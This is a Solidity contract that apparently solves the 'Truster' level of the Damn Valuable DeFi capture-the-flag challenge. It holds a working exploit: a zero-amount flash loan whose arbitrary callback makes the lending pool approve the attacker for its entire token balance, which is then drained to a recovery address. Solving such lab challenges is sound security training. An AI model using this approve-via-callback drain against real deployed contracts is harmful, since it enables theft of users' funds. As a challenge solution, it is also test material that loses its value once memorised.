// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";

contract TrusterSolve {

    address public immutable recovery;

    uint256 constant TOKENS_IN_POOL = 1_000_000e18;

    DamnValuableToken public immutable token;
    TrusterLenderPool public immutable pool;

    constructor(DamnValuableToken _token, TrusterLenderPool _pool, address _recovery) {
        token = _token;
        pool = _pool;
        recovery = _recovery;
    }

    function attack() external {
        pool.flashLoan(
            0,
            msg.sender,     // whatever
            address(token),
            abi.encodeWithSignature(
                "approve(address,uint256)",
                address(this), TOKENS_IN_POOL
            )
        );

        token.transferFrom(address(pool), address(this), TOKENS_IN_POOL);
        token.transfer(address(recovery), TOKENS_IN_POOL);
    }
} 